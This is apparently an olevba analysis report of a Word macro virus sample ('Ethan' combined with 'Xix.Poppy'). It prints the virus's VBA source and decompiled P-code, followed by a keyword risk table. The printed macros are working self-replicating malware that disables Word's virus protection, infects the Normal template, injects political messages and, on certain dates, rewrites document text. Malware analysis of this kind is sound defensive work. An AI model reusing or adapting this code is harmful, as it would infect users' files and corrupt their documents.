olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ethan.bv
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ethan.bv - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
With Options:
    Set prevDocument = NormalTemplate
    Set nextDocument = newDocument
    .SaveNormalPrompt = False:
    .SavePropertiesPrompt = False:
End With
s = ActiveDocument.Saved
sName = "c:\evolve.tmp"
sFunc = "Private Sub Document_Open()"
Found = False
If Dir(sName) <> "" Then Kill sName
Open sName For Output As #1
For i = 0 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Found = False And (a = sFunc) Then Found = True
    If a <> "" And Found = True Then Print #1, a
    If a = "End Sub" And Found = True Then Found = False
Next i
Close #1
j = 1
k = 1
t = 0
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
    t = t + 1
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
    t = t + 2
End If
If t > 0 Then
    Open sName For Input As #1
    If LOF(1) = 0 Then GoTo quit
    i = 1
    Do While Not EOF(1)
        Line Input #1, a
        If t = 1 Or t = 3 Then
            nml.CodeModule.InsertLines j, a
            j = j + 1
        End If
        If t = 2 Or t = 3 Then
            atv.CodeModule.InsertLines k, a
            k = k + 1
        End If
    Loop
quit:
    Close #1
End If
With Dialogs(wdDialogFileSumaryInfo):
    .Title = "Ethan Frome":
    .Author = "EW/LN/CB":
    .Keywrds = "Ethan":
    .Execute:
End With
If Left(ActiveDocument.Name, 8) <> "Document" Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
Kill sName
Application.EnableCancelKey = wdCancelInterrupt
End Sub
-------------------------------------------------------------------------------
VBA MACRO xix.bas 
in file: ./Virus.MSWord.Ethan.bv - OLE stream: 'Macros/VBA/xix'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub xix()
    
    'VMPCK 1.0d w/Random Path + Update
    '=================================
    'Code Written by VicodinES
    '=================================
    'Poppy ID : 5083-QyUo94005083.c
    '=================================
    'This Virus Is: Xix.Poppy
    
On Error Resume Next
Randomize
BzUz7979 = OnLnBvVq & GjCy17022 & JvCeAiQx & VxLk11768
KrNo8852 = ReRnBxQg & UvHm12817 & LsKgBxIj & TiFo12200
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("xix").Export "c:\xix.drv"
ActiveDocument.ReadOnlyRecommended = False
NsRt = Int(Rnd * 100)
    If NsRt = 99 Then MsgBox "Dia 8 de Novembro VOTA NĂO ŕ regionalizaçăo!", vbSystemModal
MgToTvGm = VwDx2292 & LlPg10701
If Day(Now()) = 8 Then Call UmCu9400BsTy
DgCx6829 = DrGhQhNe & ExCf6570 & Int(Rnd * 2675)
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "VOTA NĂO Ŕ REGIONALIZAÇĂO! SIM AO REFORÇO DO MUNICIPALISMO!"
    .Subject = "JOĂO JARDIM x8?! PORRA! DIA 8 VOTA NĂO!"
    .Comments = "A REGIONALIZAÇĂO É UM ERRO COLOSSAL!"
    .Execute
End With
If NormalTemplate.VBProject.VBComponents.Item("xix").Name <> "xix" Then MvBv508370643 = True
PlEqIfRo = QwLq7775 & OpHg16129
If ActiveDocument.VBProject.VBComponents.Item("xix").Name <> "xix" Then TxHi70648 = True
If MvBv508370643 = True And TxHi70648 = False Then Set JxPg706450836 = NormalTemplate.VBProject.VBComponents
If MvBv508370643 = False And TxHi70648 = True Then Set JxPg706450836 = ActiveDocument.VBProject.VBComponents
JxPg706450836.import "c:\xix.drv"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If TxHi70648 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
'VMPCK v1.0d [The Final Version?]
GoNqGpTs:
End Sub
Sub HelpAbout()
    On Error Resume Next
IqAj10564 = SgGwHmVe & KlLp7022 & PeVyEhIs & NkCo10807
    MsgBox "Joăo Jardim x8?! Porra! Dia 8 Vota NĂO!", vbInformation
End Sub
Sub AutoOpen()
    On Error Resume Next
PuIq14134 = TkEmRxTv & FyIe14577 & Int(Rnd * 8391)
    Call xix
SxLn19336 = OyOrAfGz & QtGv12202 & Int(Rnd * 9871)
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call xix
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call xix
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call xix
ChNz19101 = EwCyLsKj & LuTw19501 & Int(Rnd * 9898)
NhAlIqVz = NhNm11382 & TqVm7492
End Sub
Sub UmCu9400BsTy()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "sim"
            .Replacement.Text = "năo ŕ regionalizaçăo!"
            .Forward = True
            .Wrap = wdFindContinue
            .FORMAT = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Ethan.bv
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4186 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #3:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #4:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set prevDocument 
' Line #5:
' 	SetStmt 
' 	Ld newDocument 
' 	Set nextDocument 
' Line #6:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' Line #7:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' 	BoS 0x0000 
' Line #8:
' 	EndWith 
' Line #9:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #10:
' 	LitStr 0x000D "c:\evolve.tmp"
' 	St sName 
' Line #11:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St sFunc 
' Line #12:
' 	LitVarSpecial (False)
' 	St Found 
' Line #13:
' 	Ld sName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #14:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #16:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #17:
' 	Ld Found 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld a 
' 	Ld sFunc 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Found 
' 	EndIf 
' Line #18:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' 	EndIf 
' Line #19:
' 	Ld a 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Found 
' 	EndIf 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #22:
' 	LitDI2 0x0001 
' 	St j 
' Line #23:
' 	LitDI2 0x0001 
' 	St k 
' Line #24:
' 	LitDI2 0x0000 
' 	St t 
' Line #25:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nml 
' Line #27:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #30:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set atv 
' Line #31:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Add 
' 	St t 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Ld t 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #34:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #35:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo quit 
' 	EndIf 
' Line #36:
' 	LitDI2 0x0001 
' 	St i 
' Line #37:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #39:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #40:
' 	Ld j 
' 	Ld a 
' 	Ld nml 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #41:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #44:
' 	Ld k 
' 	Ld a 
' 	Ld atv 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #45:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	Loop 
' Line #48:
' 	Label quit 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartWithExpr 
' 	Ld wdDialogFileSumaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' Line #52:
' 	LitStr 0x000B "Ethan Frome"
' 	MemStWith Title 
' 	BoS 0x0000 
' Line #53:
' 	LitStr 0x0008 "EW/LN/CB"
' 	MemStWith Author 
' 	BoS 0x0000 
' Line #54:
' 	LitStr 0x0005 "Ethan"
' 	MemStWith Keywrds 
' 	BoS 0x0000 
' Line #55:
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' Line #56:
' 	EndWith 
' Line #57:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #58:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #61:
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' Line #62:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #63:
' 	EndSub 
' Macros/VBA/xix - 5994 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Sub xix())
' Line #2:
' Line #3:
' 	QuoteRem 0x0004 0x0021 "VMPCK 1.0d w/Random Path + Update"
' Line #4:
' 	QuoteRem 0x0004 0x0021 "================================="
' Line #5:
' 	QuoteRem 0x0004 0x0019 "Code Written by VicodinES"
' Line #6:
' 	QuoteRem 0x0004 0x0021 "================================="
' Line #7:
' 	QuoteRem 0x0004 0x001E "Poppy ID : 5083-QyUo94005083.c"
' Line #8:
' 	QuoteRem 0x0004 0x0021 "================================="
' Line #9:
' 	QuoteRem 0x0004 0x0018 "This Virus Is: Xix.Poppy"
' Line #10:
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	ArgsCall Read 0x0000 
' Line #13:
' 	Ld OnLnBvVq 
' 	Ld GjCy17022 
' 	Concat 
' 	Ld JvCeAiQx 
' 	Concat 
' 	Ld VxLk11768 
' 	Concat 
' 	St BzUz7979 
' Line #14:
' 	Ld ReRnBxQg 
' 	Ld UvHm12817 
' 	Concat 
' 	Ld LsKgBxIj 
' 	Concat 
' 	Ld TiFo12200 
' 	Concat 
' 	St KrNo8852 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #18:
' 	LitStr 0x000A "c:\xix.drv"
' 	LitStr 0x0003 "xix"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #20:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	St NsRt 
' Line #21:
' 	Ld NsRt 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002C "Dia 8 de Novembro VOTA NĂO ŕ regionalizaçăo!"
' 	Ld vbSystemModal 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #22:
' 	Ld VwDx2292 
' 	Ld LlPg10701 
' 	Concat 
' 	St MgToTvGm 
' Line #23:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) UmCu9400BsTy 0x0000 
' 	EndIf 
' Line #24:
' 	Ld DrGhQhNe 
' 	Ld ExCf6570 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0A73 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St DgCx6829 
' Line #25:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #26:
' 	LitStr 0x003B "VOTA NĂO Ŕ REGIONALIZAÇĂO! SIM AO REFORÇO DO MUNICIPALISMO!"
' 	MemStWith Author 
' Line #27:
' 	LitStr 0x0027 "JOĂO JARDIM x8?! PORRA! DIA 8 VOTA NĂO!"
' 	MemStWith Subject 
' Line #28:
' 	LitStr 0x0024 "A REGIONALIZAÇĂO É UM ERRO COLOSSAL!"
' 	MemStWith Comments 
' Line #29:
' 	ArgsMemCallWith Execute 0x0000 
' Line #30:
' 	EndWith 
' Line #31:
' 	LitStr 0x0003 "xix"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0003 "xix"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St MvBv508370643 
' 	EndIf 
' Line #32:
' 	Ld QwLq7775 
' 	Ld OpHg16129 
' 	Concat 
' 	St PlEqIfRo 
' Line #33:
' 	LitStr 0x0003 "xix"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0003 "xix"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St TxHi70648 
' 	EndIf 
' Line #34:
' 	Ld MvBv508370643 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld TxHi70648 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set JxPg706450836 
' 	EndIf 
' Line #35:
' 	Ld MvBv508370643 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld TxHi70648 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set JxPg706450836 
' 	EndIf 
' Line #36:
' 	LitStr 0x000A "c:\xix.drv"
' 	Ld JxPg706450836 
' 	ArgsMemCall import 0x0001 
' Line #37:
' 	Ld activeinst 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #38:
' 	Ld TxHi70648 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #39:
' 	QuoteRem 0x0000 0x0020 "VMPCK v1.0d [The Final Version?]"
' Line #40:
' 	Label GoNqGpTs 
' Line #41:
' 	EndSub 
' Line #42:
' 	FuncDefn (Sub HelpAbout())
' Line #43:
' 	OnError (Resume Next) 
' Line #44:
' 	Ld SgGwHmVe 
' 	Ld KlLp7022 
' 	Concat 
' 	Ld PeVyEhIs 
' 	Concat 
' 	Ld NkCo10807 
' 	Concat 
' 	St IqAj10564 
' Line #45:
' 	LitStr 0x0027 "Joăo Jardim x8?! Porra! Dia 8 Vota NĂO!"
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Sub AutoOpen())
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	Ld TkEmRxTv 
' 	Ld FyIe14577 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x20C7 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St PuIq14134 
' Line #50:
' 	ArgsCall (Call) xix 0x0000 
' Line #51:
' 	Ld OyOrAfGz 
' 	Ld QtGv12202 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x268F 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St SxLn19336 
' Line #52:
' 	EndSub 
' Line #53:
' 	FuncDefn (Sub ToolsMacro())
' Line #54:
' 	OnError (Resume Next) 
' Line #55:
' 	ArgsCall (Call) xix 0x0000 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Sub FileTemplates())
' Line #58:
' 	OnError (Resume Next) 
' Line #59:
' 	ArgsCall (Call) xix 0x0000 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Sub ViewVBCode())
' Line #62:
' 	OnError (Resume Next) 
' Line #63:
' 	ArgsCall (Call) xix 0x0000 
' Line #64:
' 	Ld EwCyLsKj 
' 	Ld LuTw19501 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x26AA 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St ChNz19101 
' Line #65:
' 	Ld NhNm11382 
' 	Ld TqVm7492 
' 	Concat 
' 	St NhAlIqVz 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub UmCu9400BsTy())
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #70:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #71:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #72:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #73:
' 	LitStr 0x0003 "sim"
' 	MemStWith Then 
' Line #74:
' 	LitStr 0x0015 "năo ŕ regionalizaçăo!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #75:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #76:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #77:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #78:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #79:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #80:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #81:
' 	EndWith 
' Line #82:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #83:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #84:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #85:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #86:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |newDocument         |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

